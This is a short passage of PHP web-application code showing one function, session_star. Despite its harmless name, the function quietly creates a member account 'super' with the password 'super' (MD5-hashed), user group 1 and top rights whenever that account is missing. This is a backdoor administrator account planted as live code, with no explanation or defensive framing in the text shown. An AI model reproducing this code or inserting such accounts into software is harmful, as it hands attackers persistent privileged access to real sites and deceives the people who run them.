...
function session_star(){
    $conf['MB_username'] = 'super';
    $conf['MB_userpwd'] = md5('super');
    $conf['MB_userGroup'] = 1;
    $conf['MB_right'] = 1;
    if(!M('member')->where(array('MB_username'=>'super'))->find()){
        M('member')->add($conf);
    }
}
/**
